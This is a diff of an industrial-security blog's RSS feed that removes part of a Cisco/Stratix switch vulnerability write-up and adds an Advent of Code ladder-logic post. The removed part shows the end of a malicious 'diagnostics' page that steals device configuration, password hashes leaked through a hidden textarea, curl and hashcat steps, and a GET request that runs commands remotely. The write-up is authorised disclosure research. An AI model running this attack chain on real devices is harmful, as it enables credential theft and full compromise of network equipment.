-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            });
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        });
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// Execute multiple attacks
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;stealData&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;show running-config&amp;#39;&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;stealData&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;show startup-config&amp;#39;&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;stealData&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;show version&amp;#39;&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;stealData&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dir flash:&amp;#39;&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;textContent&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;✓ Diagnostics complete!&amp;#39;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Attack outcome:&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Full device configuration stolen&lt;/li&gt;
-&lt;li&gt;All credentials exfiltrated&lt;/li&gt;
-&lt;li&gt;Network topology revealed&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;No user interaction beyond clicking link&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;No visible evidence of attack&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;impact-1&#34;&gt;Impact
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Unauthenticated to RCE&lt;/strong&gt;: Attacker doesn&amp;rsquo;t need credentials, just needs admin to visit webpage&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Mass exploitation&lt;/strong&gt;: Single malicious webpage can attack all administrators who visit it&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Stealth&lt;/strong&gt;: No logs, no alerts, admin sees &amp;ldquo;legitimate&amp;rdquo; diagnostic tool&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Supply chain attack&lt;/strong&gt;: Could be embedded in compromised vendor tools/documentation&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr&gt;
-&lt;h2 id=&#34;critical-finding-3-password-hash-exposure&#34;&gt;Critical Finding #3: Password Hash Exposure
-&lt;/h2&gt;&lt;p&gt;The &lt;code&gt;useraccounts.shtml&lt;/code&gt; page includes a hidden textarea that contains the output of Server-Side Include (SSI) commands, exposing all user account password hashes in the HTML source code.&lt;/p&gt;
-&lt;h3 id=&#34;vulnerable-code&#34;&gt;Vulnerable Code
-&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;File: &lt;code&gt;useraccounts.shtml&lt;/code&gt; (Lines 693-706)&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;textarea&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;style&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;display:none; visibility:hidden;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;USER_SUMMARY&amp;#34;&lt;/span&gt;&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!--#exec cmd=&amp;#39;more system:running-config | i user&amp;#39;--&amp;gt;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;textarea&lt;/span&gt;&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;When rendered, this becomes:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;textarea&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;style&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;display:none; visibility:hidden;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;USER_SUMMARY&amp;#34;&lt;/span&gt;&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;username admin privilege 15 secret 5 $1$P4Bi$8t74cAAknpCiVCvL7IC6T.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;username vulntest privilege 5 secret 9 $9$wLzi8Cmi6aH91k$qOAH1kOzmLhTX1tKqGx/BMhZ.2x3lvdlck6l3ES8.1.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;textarea&lt;/span&gt;&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.ics.red/posts/stratix-5400-research/hashleak.png&#34;
-	width=&#34;1552&#34;
-	height=&#34;206&#34;
-	srcset=&#34;https://blog.ics.red/posts/stratix-5400-research/hashleak_hu9168787486100869449.png 480w, https://blog.ics.red/posts/stratix-5400-research/hashleak_hu13994499626064948689.png 1024w&#34;
+&lt;h3 id=&#34;rung-2---check-if-complete&#34;&gt;Rung 2 - Check If Complete
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://blog.ics.red/images/aoc/Rung3.png&#34;
+	
+	
+	
 	loading=&#34;lazy&#34;
 	
-		alt=&#34;Password Hash Exposure&#34;
+		alt=&#34;Rung 3&#34;
 	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;753&#34;
-		data-flex-basis=&#34;1808px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;Screenshot showing admin password hash visible in page source to read-only user&lt;/em&gt;&lt;/p&gt;
-&lt;h3 id=&#34;exploitation&#34;&gt;Exploitation
-&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Step 1: Access page (even as read-only user)&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -k -u vulntest:vulntest https://192.168.103.143/useraccounts.shtml
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Step 2: View HTML source&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Extract USER_SUMMARY textarea&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;grep -A &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;USER_SUMMARY&amp;#34;&lt;/span&gt; useraccounts.shtml
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Step 3: Parse password hashes&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Admin user:
-  Username: admin
-  Privilege: 15 (full admin)
-  Hash Type: 5 (MD5-crypt)
-  Hash: $1$P4Bi$8t74cAAknpCiVCvL7IC6T.
-  Strength: WEAK - Deprecated algorithm, easily crackable
-
-Read-only user:
-  Username: vulntest
-  Privilege: 5 (read-only)
-  Hash Type: 9 (scrypt)
-  Hash: $9$wLzi8Cmi6aH91k$qOAH1kOzmLhTX1tKqGx/BMhZ.2x3lvdlck6l3ES8.1.
-  Strength: STRONG - Modern algorithm
-&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
-&lt;h2 id=&#34;the-complete-attack-chain&#34;&gt;The Complete Attack Chain
-&lt;/h2&gt;&lt;h3 id=&#34;phase-1-initial-access&#34;&gt;Phase 1: Initial Access
-&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Attacker obtains read-only credentials
-• Default credentials (cisco/cisco)
-• Weak passwords (guessable)
-• Social engineering
-
-Login: vulntest / vulntest
-Privilege Level: 5 (Read-Only)
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-2-information-disclosure&#34;&gt;Phase 2: Information Disclosure
-&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Access admin page (no access control!)
-GET https://192.168.103.143/useraccounts.shtml
-
-Extract from HTML source:
-username admin privilege 15 secret 5 $1$P4Bi$8t74cA...
-
-Hash identified: MD5-crypt (WEAK)
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-3-offline-password-cracking&#34;&gt;Phase 3: Offline Password Cracking
-&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Run hashcat with GPU acceleration:
-hashcat -m 500 -a 0 hash.txt rockyou.txt
-
-Crack time: 15 minutes (common wordlist + GPU)
-
-Cracked password: Stephen13
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-4-admin-access&#34;&gt;Phase 4: Admin Access
-&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Login: admin / Stephen13
-Privilege Level: 15 (Full Admin)
-
-✓ Full web interface access
-✓ Can create/delete users
-✓ Can modify configuration
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-5-remote-code-execution&#34;&gt;Phase 5: Remote Code Execution
-&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Use GET-based RCE endpoint:
-GET /%24b%0A?b=show%20running-config
-
-Extract:
-✓ All user passwords and hashes
-✓ SNMP community strings
-✓ Enable secret
-✓ Network topology and VLANs
-✓ Switch interconnections (CDP/LLDP)
-
- COMPLETE DEVICE COMPROMISE
-&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
-&lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; This assessment was performed on authorized equipment for security research purposes. All findings are reported in good faith to improve security. The vulnerabilities described should only be tested on systems you own or have explicit authorization to test.&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;This post is part of my ongoing ICS security research. For more projects and research, visit the &lt;a class=&#34;link&#34; href=&#34;https://blog.ics.red/page/ics-projects/&#34; &gt;ICS Projects&lt;/a&gt; page.&lt;/em&gt;&lt;/p&gt;
+&lt;h3 id=&#34;rung-3---get-direction-from-array&#34;&gt;Rung 3 - Get Direction From Array
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://blog.ics.red/images/aoc/Rung4.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Rung 4&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;rung-4---get-distance-from-array&#34;&gt;Rung 4 - Get Distance From Array
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://blog.ics.red/images/aoc/Rung5.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Rung 5&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;rung-5---add-direction--right&#34;&gt;Rung 5 - Add (Direction = Right)
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://blog.ics.red/images/aoc/Rung5.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Rung 5&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;rung-6---subtract-direction--left&#34;&gt;Rung 6 - Subtract (Direction = Left)
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://blog.ics.red/images/aoc/Rung6.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Rung 6&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;rung-7---modulo-wraparound&#34;&gt;Rung 7 - Modulo Wraparound
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://blog.ics.red/images/aoc/Rung7.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Rung 7&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;rung-8---handle-negative-values&#34;&gt;Rung 8 - Handle Negative Values
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://blog.ics.red/images/aoc/Rung8.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Rung 8&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;rung-9---count-zeros&#34;&gt;Rung 9 - Count Zeros
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://blog.ics.red/images/aoc/Rung9.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Rung 9&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;rung-10---advance-step&#34;&gt;Rung 10 - Advance Step
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://blog.ics.red/images/aoc/Rung10.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Rung 10&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;part-2-solution&#34;&gt;Part 2 Solution
+&lt;/h2&gt;&lt;p&gt;Part 2 requires counting every time the dial crosses position 0, not just when it lands there. This adds significant complexity with 6 different cases to handle.&lt;/p&gt;
+&lt;h3 id=&#34;rung-11---zero-crossing-calculation&#34;&gt;Rung 11 - Zero Crossing Calculation
+&lt;/h3&gt;&lt;p&gt;This massive branching rung handles all the edge cases for counting zero crossings:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.ics.red/images/aoc/part2/Rung11.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Rung 11&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;rung-12---accumulate-zero-crossings&#34;&gt;Rung 12 - Accumulate Zero Crossings
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://blog.ics.red/images/aoc/part2/Rung12.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Rung 12&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;rung-13---advance-step&#34;&gt;Rung 13 - Advance Step
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://blog.ics.red/images/aoc/part2/Rung13.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Rung 13&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;em&gt;Stay tuned for more days of Advent of Code solved with ladder logic!&lt;/em&gt;&lt;/p&gt;
 </description>
         </item>
         <item>
         <title>DNP3 Timing Attack: Weaponizing Time Synchronization in Industrial Control Systems</title>
         <link>https://blog.ics.red/posts/dnp3-timing-attack/</link>
-        <pubDate>Wed, 13 Aug 2025 20:00:00 -0400</pubDate>
+        <pubDate>Thu, 14 Aug 2025 00:00:00 +0000</pubDate>
         
         <guid>https://blog.ics.red/posts/dnp3-timing-attack/</guid>
         <description>&lt;h2 id=&#34;introduction&#34;&gt;Introduction
@@ -591,16 +503,6 @@ Extract:
 &lt;p&gt;Organizations operating DNP3-based systems should evaluate their exposure to this attack vector and implement appropriate defensive measures based on their risk tolerance and operational requirements.&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;&lt;em&gt;This post is part of my ongoing ICS security research. For more projects and research, visit the &lt;a class=&#34;link&#34; href=&#34;https://blog.ics.red/page/ics-projects/&#34; &gt;ICS Projects&lt;/a&gt; page.&lt;/em&gt;&lt;/p&gt;
-</description>
-        </item>
-        <item>
-        <title>Resume</title>
-        <link>https://blog.ics.red/posts/resume/</link>
-        <pubDate>Fri, 16 May 2025 00:00:00 +0000</pubDate>
-        
-        <guid>https://blog.ics.red/posts/resume/</guid>
-        <description>&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://bucket.ics.red/StephenGlombicki_Sept9.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://bucket.ics.red/StephenGlombicki_Sept9.pdf&lt;/a&gt;&lt;/p&gt;
 </description>
         </item>
         <item>
